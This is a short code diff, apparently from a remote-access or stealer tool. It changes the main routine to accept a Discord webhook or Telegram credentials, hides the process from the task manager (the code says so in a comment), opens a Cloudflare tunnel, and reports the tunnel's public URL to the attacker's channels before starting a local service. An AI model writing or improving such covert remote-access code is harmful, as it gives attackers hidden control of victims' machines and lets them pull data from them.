@@ -3037,7 +3037,10 @@ def start_cloudflared(port: int) -> Optional[str]:
 
 def main():
     """Main function to set up and run the service."""
-    if DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+    has_discord = DISCORD_WEBHOOK_URL and not DISCORD_WEBHOOK_URL.startswith("BUILD_")
+    has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_")
+
+    if not has_discord and not has_telegram:
         return
     
     # Stealth: hide from task manager
@@ -3060,8 +3063,10 @@ def main():
     CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
     
     if CLOUDFLARED_PUBLIC_URL:
-        post_to_discord(CLOUDFLARED_PUBLIC_URL)
-        _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
+        if has_discord:
+            post_to_discord(CLOUDFLARED_PUBLIC_URL)
+        if has_telegram:
+            _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
     
     try:
         app.run(host=SERVICE_HOST, port=port, debug=False, use_reloader=False)
